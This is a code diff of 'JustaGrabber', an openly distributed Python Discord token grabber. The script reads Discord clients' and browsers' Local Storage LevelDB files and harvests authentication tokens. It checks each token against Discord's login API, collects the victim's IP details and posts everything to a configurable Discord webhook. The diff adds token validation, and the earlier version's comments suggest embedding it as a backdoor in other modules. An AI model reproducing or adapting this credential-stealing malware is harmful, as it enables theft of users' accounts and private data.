@@ -1,34 +1,34 @@
 """
-         ██╗██╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗     ██╗   ██╗    ██╗   ██████╗ 
-         ██║██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██║   ██║   ███║   ╚════██╗
-         ██║██║   ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝    ██║   ██║   ╚██║    █████╔╝
-    ██   ██║██║   ██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗    ╚██╗ ██╔╝    ██║    ╚═══██╗
-    ╚█████╔╝╚██████╔╝███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║     ╚████╔╝ ██╗ ██║██╗██████╔╝
-     ╚════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚═╝ ╚═╝╚═╝╚═════╝ 
+         ██╗██╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗     ██╗   ██╗    ██╗   ██╗  ██╗
+         ██║██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██║   ██║   ███║   ██║  ██║
+         ██║██║   ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝    ██║   ██║   ╚██║   ███████║
+    ██   ██║██║   ██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗    ╚██╗ ██╔╝    ██║   ╚════██║
+    ╚█████╔╝╚██████╔╝███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║     ╚████╔╝ ██╗ ██║██╗     ██║
+     ╚════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚═╝ ╚═╝╚═╝     ╚═╝
      
      Made by kldiscord on github. Thank you for using!
      + This is the last version of justagrabber, no updates will be realeased cuz I have to work in other projects. :(
-"""
+""" # JustaGrabber by KLDiscord
 
-import os, re, json, urllib.request,requests,datetime
+import os, re, json, urllib.request,datetime # Importing modules
 
 WEBHOOK_URL = ''
-# Type your discord webhook url over here
+# Type your discord webhook url over here 
 
-Ping_me = True
-Blacklist = ["BlacklistedPeople2", "BlacklistedPeople2"] # If username equals to Blacklist, it will print "blacklisted" and will exit. 
-# Only "PC NAME"
+Ping_me = True # IF true, Your webhook will mention you when it grab tokens.
+Blacklist = ["Blacklistedpeople1","KLDiscord"] # Blacklisted peoples. Only PC Name! 
+# If you want to check, type `print(os.getenv('USER', os.getenv('USERNAME', 'user')))` in idle, terminal or anywhere.
 
 # Checking if pcname in blacklist
 if os.getenv('USER', os.getenv('USERNAME', 'user')) in Blacklist:
     print("Blacklisted")
-    exit()
+    sys.exit()
 
 # Finding tokens method
 def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
+    path += '\\Local Storage\\leveldb' # Appdata folder
 
-    tokens = []
+    tokens = [] # Tokens list
 
     for file_name in os.listdir(path):
         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
@@ -47,7 +47,7 @@ def JustaGrabber():
     appdata = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
 
-    paths = {
+    paths = { # Browser's path
         '<Discord> ': roaming + '\\Discord',
         '<LightCord> ': roaming + '\\Lightcord',
         '<Discord_Canary>' : roaming + '\\discordcanary',
@@ -70,7 +70,6 @@ def JustaGrabber():
         '<Yandex>' : appdata + '\\Yandex\\YandexBrowser\\User Data\\Default',
         '<Naver_whale>' : appdata + '\\Naver\\Naver Whale\\User Data\\Default',
         '<Naver_whale_Flash>' : appdata + '\\Naver\\Naver Whale Flash\\User Data\\Default'
-
     }
 
     # getting ip info
@@ -90,7 +89,7 @@ def JustaGrabber():
 
     # Sending infos
     if Ping_me:
-        message = "@everyone   \n"
+        message = "@everyone   JustaGrabber found a new token! \n"
     message += "```md\n"
 
     # Find tokens
@@ -104,9 +103,14 @@ def JustaGrabber():
 
         if len(tokens) > 0:
             for token in tokens:
-                message += '<Tokens_found : ' + f'{token}' + '>' + '\n'
+                headers={ # Token checker
+                    'Authorization': token
+                }
+                src = requests.get('https://discordapp.com/api/v8/auth/login', headers=headers)
+                if src.status_code == 200:
+                    message += '<Tokens_found : ' + f'{token}' + '>' + '\n'
 
-        else:
+        else: # Print when no tokens found.
             message += '[Error](No tokens found.)\n'
 
     headers = {
@@ -116,8 +120,8 @@ def JustaGrabber():
     message += "```"
 
     # Sending message
-    payload = json.dumps({'content': message})
-    try:
+    payload = json.dumps({'content': message}) # Sending tokens.
+    try: # Embed
         req = urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
         urllib.request.urlopen(req)
         today = datetime.date.today()
@@ -141,15 +145,16 @@ def JustaGrabber():
                 }
             }
         ]
-        }
-        requests.post(WEBHOOK_URL, json=alert)
+        } 
+        requests.post(WEBHOOK_URL, json=alert) # Sending embeds
     except:
         pass
 
-# Only runs if starts this flie. If imported, will be not running.
-# If you wanna use this as backdoor in your module, just delete line 151~
-if __name__ == '__main__':
-    JustaGrabber()
-else:
-    print("Error 404")
-
+# Module chekcer
+import sys
+try:
+    import requests
+    if __name__ == "__main__":
+        JustaGrabber()
+except ModuleNotFoundError: # If requests module not exists, JustaGrabber will not do anything
+    sys.exit()
